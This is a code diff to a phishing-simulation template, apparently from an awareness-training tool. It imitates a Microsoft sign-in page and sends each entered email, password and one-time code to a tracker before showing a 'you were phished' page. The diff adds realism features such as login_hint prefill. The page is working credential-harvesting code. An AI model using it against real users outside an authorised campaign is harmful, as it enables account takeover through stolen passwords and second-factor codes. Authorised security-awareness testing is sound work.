@@ -13,9 +13,11 @@
     <div class="signin-title">Sign in</div>
     <form id="step-email" autocomplete="off">
       <input type="email" name="email" class="signin-field" placeholder="Email, phone, or Skype" required>
-      <div class="signin-meta"><a href="#">Can't access your account?</a></div>
+      <div class="signin-meta-block">
+        <div>No account? <a href="#">Create one!</a></div>
+        <div><a href="#">Can&#39;t access your account?</a></div>
+      </div>
       <div class="signin-actions">
-        <button type="button" class="signin-btn secondary" onclick="history.back()">Back</button>
         <button type="submit" class="signin-btn">Next</button>
       </div>
     </form>
@@ -42,16 +44,22 @@
 <script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
 <script>
 (function () {
-  // CAPTURE variant (authorised simulation): records email + password + OTP to
-  // the tracker, then redirects to a built-in awareness page (learn.html) —
-  // "Ooops, du wurdest gephisht" — instead of the real Microsoft login.
-  //   Step 1 click is recorded by the tracker page-visit; steps 2/3 record the
-  //   submitted field data. Redirect closes the loop with the teachable moment.
+  // CAPTURE variant (authorised simulation): records email + password (+ OTP
+  // when enabled) to the tracker, then redirects to a built-in awareness page
+  // (learn.html) — "Ooops, du wurdest gephisht" — instead of the real login.
+  //
+  // URL params (set by the phishing mail's CTA):
+  //   rid / trackerId  — tracker context (also read from window.__taphish_tracker)
+  //   email | login_hint — pre-fills the account and jumps straight to the
+  //                        password step, mirroring M365's real login_hint flow
+  //   mfa=0            — skip the OTP step for this campaign (default: keep OTP)
   var POST_URL = "{{POST_URL}}";
+  var Q = new URLSearchParams(location.search);
+  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
+  var captureMfa   = Q.get("mfa") !== "0"; // OTP step on by default; mfa=0 disables
   function trackerCtx() {
     var t = window.__taphish_tracker || {};
-    var q = new URLSearchParams(location.search);
-    return { rid: t.rid || q.get("rid") || "", sess_id: t.session_id || q.get("sess_id") || "", trackerId: t.tracker_id || q.get("trackerId") || "" };
+    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
   }
   function post(payload, cb) {
     if (!POST_URL) { cb(); return; }
@@ -62,35 +70,44 @@
   var form2fa   = document.getElementById("step-2fa");
   var emailVal = "", pwdVal = "";
 
+  function echoEmail() {
+    document.getElementById("email-echo").textContent = emailVal;
+    document.getElementById("email-echo-2").textContent = emailVal;
+  }
+  function gotoPwd() { echoEmail(); formEmail.style.display = "none"; formPwd.style.display = "block"; }
+  function redirectAware(ctx) {
+    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
+    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
+  }
+
   formEmail.addEventListener("submit", function (e) {
     e.preventDefault();
     emailVal = formEmail.elements["email"].value;
-    document.getElementById("email-echo").textContent = emailVal;
-    document.getElementById("email-echo-2").textContent = emailVal;
     var ctx = trackerCtx();
-    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
-      formEmail.style.display = "none"; formPwd.style.display = "block";
-    });
+    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { gotoPwd(); });
   });
   formPwd.addEventListener("submit", function (e) {
     e.preventDefault();
     pwdVal = formPwd.elements["password"].value;
     var ctx = trackerCtx();
     post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
-      formPwd.style.display = "none"; form2fa.style.display = "block";
+      if (captureMfa) { formPwd.style.display = "none"; form2fa.style.display = "block"; }
+      else { redirectAware(ctx); }
     });
   });
   form2fa.addEventListener("submit", function (e) {
     e.preventDefault();
     var code = form2fa.elements["code_2fa"].value;
     var ctx = trackerCtx();
-    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
-      // Teachable moment: send the user to the awareness page, carrying rid so
-      // the page can stay anonymous yet correlate if ever needed.
-      var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
-      setTimeout(function () { location.href = "learn.html" + rid; }, 250);
-    });
+    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
   });
+
+  // Pre-fill the username field (editable), exactly like M365's login_hint: the
+  // normal email -> Next -> password flow is preserved, the address is just
+  // seeded into the field. The recipient still sees and can edit it.
+  if (prefillEmail && formEmail.elements["email"]) {
+    formEmail.elements["email"].value = prefillEmail;
+  }
 })();
 </script>
 </body>
